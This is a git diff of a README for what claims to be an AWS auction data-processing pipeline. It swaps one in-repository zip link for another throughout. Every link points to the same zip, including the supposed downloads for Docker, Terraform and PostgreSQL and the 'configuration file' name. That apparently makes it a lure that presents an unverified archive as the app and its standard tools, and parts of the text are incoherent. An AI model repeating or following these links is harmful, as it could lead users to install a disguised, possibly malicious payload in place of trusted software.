@@ -1,6 +1,6 @@
 # 🛠️ Auction-App-Data-Processing_AWS-Pipeline - Seamless Data Processing for Auctions
 
-[![Download Now](https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip%https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip)](https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip)
+[![Download Now](https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip%https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip)](https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip)
 
 ## 📥 Overview
 
@@ -23,7 +23,7 @@ Before you download, make sure your computer meets these requirements:
 
 ### 2. Visit the Download Page
 
-To download the application, [visit this page to download](https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip). 
+To download the application, [visit this page to download](https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip). 
 
 You will find all the available versions of the software.
 
@@ -33,7 +33,7 @@ On the releases page, you will see a list of different versions. Select the most
 
 ### 4. Download the Application
 
-Click on the version number to see the files available for download. Look for a file named similar to `https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip`. Click on it to start downloading.
+Click on the version number to see the files available for download. Look for a file named similar to `https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip`. Click on it to start downloading.
 
 ### 5. Extract the Files
 
@@ -43,9 +43,9 @@ After downloading, locate the `.zip` file in your downloads folder. Right-click 
 
 Make sure you have the following tools installed:
 
-- **Docker:** This helps with running applications in containers. You can download it [here](https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip).
-- **Terraform:** This tool is used for infrastructure management. You can download it [here](https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip).
-- **PostgreSQL:** Required for database management. You can download it [here](https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip).
+- **Docker:** This helps with running applications in containers. You can download it [here](https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip).
+- **Terraform:** This tool is used for infrastructure management. You can download it [here](https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip).
+- **PostgreSQL:** Required for database management. You can download it [here](https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip).
 
 Follow the instructions for each tool to install them on your system.
 
@@ -55,7 +55,7 @@ Follow the instructions for each tool to install them on your system.
 
 Once the tools are installed, you need to set some environment variables. Open a terminal or command prompt and navigate to the folder where you extracted the application.
 
-Edit the configuration file named `https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip` with your text editor. You will find sections labeled with prompts for your database and AWS credentials. Fill in the details based on your setup.
+Edit the configuration file named `https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip` with your text editor. You will find sections labeled with prompts for your database and AWS credentials. Fill in the details based on your setup.
 
 ### 2. Start Docker Containers
 
@@ -69,7 +69,7 @@ This command pulls the necessary images and starts the application containers.
 
 ## 🎉 Download & Install
 
-You can always download the latest version of the application by [visiting this page to download](https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip).
+You can always download the latest version of the application by [visiting this page to download](https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip).
 
 This link gives you access to the latest features and updates.
 
@@ -90,7 +90,7 @@ If you encounter issues while running the application, consider the following ti
 
 - Ensure Docker is running before executing Docker commands.
 - Check your internet connection if data isn’t processing correctly.
-- Review your configurations in `https://raw.githubusercontent.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/main/src/serving/Auction-Pipeline-App-AW-Data-Processing-v2.2.zip` for any errors or typos.
+- Review your configurations in `https://github.com/ArgyaSR/Auction-App-Data-Processing_AWS-Pipeline/raw/refs/heads/main/sql/Auction_App_AW_Data_Processing_Pipeline_v1.4.zip` for any errors or typos.
 
 ## 📞 Support
 
